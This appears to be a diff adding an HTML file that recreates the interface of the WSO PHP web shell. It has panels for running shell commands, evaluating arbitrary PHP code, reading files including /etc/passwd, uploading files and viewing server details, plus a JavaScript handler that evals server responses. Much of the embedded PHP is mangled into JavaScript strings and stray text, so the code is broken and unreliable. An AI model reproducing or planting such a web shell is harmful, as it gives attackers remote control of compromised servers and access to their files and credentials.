@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<!--
+To change this license header, choose License Headers in Project Properties
+To change this template file, choose Tools | Templates
+and open the template in the editor
+-->
+<html>
+    <head>
+        <title>TODO supply a title</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=10">
+        <script type="text/javascript" >
+            function algo() {
+                var c_ = '" . htmlspecialchars($GLOBALS[' + cwd + ']) . "';
+                var a_ = '" . htmlspecialchars(@$_POST[' + a + ']) . "';
+                var charset_ = '" . htmlspecialchars(@$_POST[' + charset + ']) . "';
+                var p1_ = '" . ((strpos(@$_POST[' + p1 + '], "n") !== false) ? ' +
+                        ' : htmlspecialchars($_POST[' + p1 + '], ENT_QUOTES)) . "';
+                var p2_ = '" . ((strpos(@$_POST[' + p2 + '], "n") !== false) ? ' +
+                        ' : htmlspecialchars($_POST[' + p2 + '], ENT_QUOTES)) . "';
+                var p3_ = '" . ((strpos(@$_POST[' + p3 + '], "n") !== false) ? ' +
+                        ' : htmlspecialchars($_POST[' + p3 + '], ENT_QUOTES)) . "';
+                var d = document;
+                function set(a, c, p1, p2, p3, charset) {
+                    if (a != null)
+                        d.mf.a.value = a;
+                    else
+                        d.mf.a.value = a_;
+                    if (c != null)
+                        d.mf.c.value = c;
+                    else
+                        d.mf.c.value = c_;
+                    if (p1 != null)
+                        d.mf.p1.value = p1;
+                    else
+                        d.mf.p1.value = p1_;
+                    if (p2 != null)
+                        d.mf.p2.value = p2;
+                    else
+                        d.mf.p2.value = p2_;
+                    if (p3 != null)
+                        d.mf.p3.value = p3;
+                    else
+                        d.mf.p3.value = p3_;
+                    if (charset != null)
+                        d.mf.charset.value = charset;
+                    else
+                        d.mf.charset.value = charset_;
+                }
+                function g(a, c, p1, p2, p3, charset) {
+                    set(a, c, p1, p2, p3, charset);
+                    d.mf.submit();
+                }
+                function a(a, c, p1, p2, p3, charset) {
+                    set(a, c, p1, p2, p3, charset);
+                    var params = 'ajax=true';
+                    for (i = 0; i < d.mf.elements.length; i++) {
+                        params += '&' + d.mf.elements[i].name + '=' + encodeURIComponent(d.mf.elements[i].value);
+                    }
+                    sr('" . addslashes($_SERVER[' + REQUEST_URI + ']) . "', params);
+                }
+                function sr(url, params) {
+                    if (window.XMLHttpRequest)
+                        req = new XMLHttpRequest();
+                    else if (window.ActiveXObject)
+                        req = new ActiveXObject('Microsoft.XMLHTTP');
+                    if (req) {
+                        req.onreadystatechange = processReqChange;
+                        req.open('POST', url, true);
+                        req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                        req.send(params);
+                    }
+                }
+                function processReqChange() {
+                    if ((req.readyState == 4))
+                        if (req.status == 200) {
+                            var reg = new RegExp("(d+)([Ss]*)", 'm');
+                            var arr = reg.exec(req.responseText);
+                            eval(arr[2].substr(0, arr[1]));
+                        } else {
+                            alert('Request error!');
+                        }
+                }
+            }
+        </script>
+    </head>
+    <body>        
+        <div style="margin:5">header</div>
+        <table class="info" cellpadding="3" cellspacing="0" width="100%">
+            <tr>
+                <td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:  ($GLOBALS[os] == win ? <br>Drives: : )  </span></td>
+                <td>
+                    <div> substr(@php_uname(), 0, 120) <a href="  $explink  " target=_blank>[exploit-dbcom]</a></div>
+                    <br> $uid ( $user ) <span>Group:</span> $gid ( $group )
+                    <br> @phpversion() <span>Safe mode:</span> 
+                    ($GLOBALS[safe_mode] 
+                    ? <font color=red>ON</font> 
+                    : <font color=green><b>OFF</b></font>)
+                    <a href=# onclick="g('Php', null, '', 'info')">[ phpinfo ]</a> 
+                    <span>Datetime:</span> date(Y-m-d H:i:s)
+                    <br> wsoViewSize($totalSpace) <span>Free:</span> wsoViewSize($freeSpace) ( (int) ($freeSpace / $totalSpace * 100) %)
+                    <br> $cwd_links wsoPermsColor($GLOBALS[cwd]) 
+                    <a href=# onclick="g('FilesMan', '$GLOBALS[home_cwd]', '', '', '')">[ home ]</a>
+                    <br> $drives </td>
+                <td width=1 align=right>
+                    <div>
+                        <select onchange="g(null, null, null, null, null, thisvalue)">
+                            <optgroup label="Page charset">
+                            </optgroup>
+                        </select>
+                        <br><span>Server IP:</span>
+                        <br> @$_SERVER["SERVER_ADDR"]
+                        <br><span>Client
+                            IP:</span>
+                        <br> $_SERVER[REMOTE_ADDR] </div>
+                </td>
+            </tr>
+        </table>
+        <table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%>
+            <tr> <td>$menu</td> </tr>
+        </table>
+        <div style="margin:5">footer</div>
+        <div>
+            <table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%" 
+                   style='border-top:2px solid #333;border-bottom:2px solid #333;'>
+                <tr>
+                    <td>
+                        <form onsubmit='g(null, this.c.value, "");return false;'>
+                            <span>Change dir:</span>
+                            <br><input class='toolsInp' type=text name=c value="htmlspecialchars($GLOBALS['cwd'])">
+                            <input type=submit value='>>'>
+                        </form>
+                    </td>
+                    <td>
+                        <form onsubmit="g('FilesTools', null, this.f.value);return false;">
+                            <span>Read file:</span>
+                            <br><input class='toolsInp' type=text name=f>
+                            <input type=submit value='>>'>
+                        </form>
+                    </td>
+                </tr><tr>
+                    <td>
+                        <form onsubmit="g('FilesMan', null, 'mkdir', this.d.value);return false;">
+                            <span>Make dir:</span>$is_writable
+                            <br><input class='toolsInp' type=text name=d>
+                            <input type=submit value='>>'>
+                        </form>
+                    </td>
+                    <td>
+                        <form onsubmit="g('FilesTools', null, this.f.value, 'mkfile');return false;">
+                            <span>Make file:</span>$is_writable
+                            <br><input class='toolsInp' type=text name=f>
+                            <input type=submit value='>>'>
+                        </form>
+                    </td>
+                </tr>
+                <tr>
+                    <td>
+                        <form onsubmit="g('Console', null, this.c.value);return false;">
+                            <span>Execute:</span>
+                            <br><input class='toolsInp' type=text name=c value=''>
+                            <input type=submit value='>>'>
+                        </form>
+                    </td>
+                    <td>
+                        <form method='post' ENCTYPE='multipart/form-data'>
+                            <input type=hidden name=a value='FilesMAn'>
+                            <input type=hidden name=c value="$GLOBALS['cwd']">
+                            <input type=hidden name=p1 value='uploadFile'>
+                            <input type=hidden name=charset value=" . (isset($_POST['charset']) ? $_POST['charset'] : '') . ">
+                            <span>Upload file:</span>$is_writable
+                            <br><input class='toolsInp' type=file name=f>
+                            <input type=submit value='>>'>
+                        </form>
+                        <br >
+                    </td>
+                </tr>
+            </table>
+        </div>
+        <br/>
+        <span>posix_getpwuid ("Read" /etc/passwd)</span>
+        <form onsubmit='g(null, null, "5", this.param1.value, this.param2.value);return false;'>
+            <table>
+                <tr>
+                    <td>From</td>
+                    <td><input type=text name=param1 value=0></td>
+                </tr>
+                <tr>
+                    <td>To</td>
+                    <td><input type=text name=param2 value=1000></td>
+                </tr>
+            </table>
+            <input type=submit value=">>">
+        </form>
+        
+        <h1>Execution PHP-code</h1><div class=content>
+            <form name=pf method=post onsubmit="if(this.ajax.checked){a('Php',null,this.code.value);}else{g('Php',null,this.code.value,'');}return false;">
+                <textarea name=code class=bigarea id=PhpCode> . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . </textarea>
+                <input type=submit value=Eval style="margin-top:5px">
+                <input type=checkbox name=ajax value=1> ($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . ' send using AJAX
+            </form>
+            <pre id=PhpOutput style="" class=ml1>
+                
+            </pre></div>
+    </body>
+</html>
